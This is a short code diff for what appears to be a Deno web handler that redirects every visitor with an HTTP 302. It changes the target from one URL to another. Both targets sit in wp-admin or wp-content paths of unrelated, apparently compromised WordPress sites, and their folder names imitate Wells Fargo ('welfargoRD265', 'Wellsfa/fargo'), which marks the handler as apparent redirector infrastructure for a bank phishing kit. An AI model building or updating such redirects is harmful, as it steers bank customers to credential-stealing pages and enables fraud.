@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://waroeng88.org/wp-admin/Wellsf/welfargoRD265/", // Replace this with your actual link
+      Location: "https://vsi.dyz.mybluehost.me/demo/wp-content/Wellsfa/fargo/", // Replace this with your actual link
     },
   });
 });
